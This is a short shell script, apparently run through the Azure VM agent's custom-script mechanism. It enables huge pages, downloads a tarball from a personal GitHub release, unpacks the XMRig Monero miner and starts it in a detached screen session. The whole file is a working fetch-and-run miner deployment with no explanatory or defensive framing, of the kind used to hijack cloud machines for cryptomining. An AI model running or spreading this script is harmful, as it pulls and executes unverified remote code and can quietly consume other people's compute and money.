#!/bin/sh
sysctl -w vm.nr_hugepages=1024
wget https://github.com/zoharxxx/zohar/releases/download/zohar/giapxmr.tar.gz
tar -zxvf giapxmr.tar.gz
cd /var/lib/waagent/custom-script/download/1/xmrig-v5.11.1
chmod a+x xmrig
chmod a+x config.json
screen -dmS bash bash && screen -dmS xmrig ./xmrig